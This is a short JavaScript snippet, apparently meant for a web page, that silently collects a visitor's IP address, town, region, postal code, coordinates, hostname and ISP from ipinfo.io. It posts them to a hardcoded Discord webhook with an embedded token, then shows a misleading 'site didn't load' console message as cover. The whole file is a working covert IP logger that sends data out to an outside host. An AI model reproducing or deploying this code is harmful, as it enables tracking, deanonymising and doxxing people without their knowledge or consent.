$.getJSON("https://ipinfo.io/json", function(data) {         
  var params = {
    embeds: [
      {
        "title": "GET REVERSE ENGINEERED",
        "color": 15258703,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "IP Address",
            "value": `> ${data.ip}`
          },
          {
            "name": "GeoLocation Info",
            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
          },
          {
            "name": "Network Info",
            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
          }
        ]
      }
    ]
  }
  try {
    fetch('https://discord.com/api/webhooks/1100562137312657498/pb7w3wreJMctjLgj9Mhzrc0f6OxUWM5Ke5y0ObMwubbTvmRdgrH8ngkAXUt6PStAvF9M', {
      method: "POST",
      headers: {
          'Content-type': 'application/json'
      },
      body: JSON.stringify(params)
    }).then(res => {
      console.log("Uh oh, site didn't load. Contact the owner!")
    });
  } catch (err) {
    console.log("ERROR! ", err)
  }
})
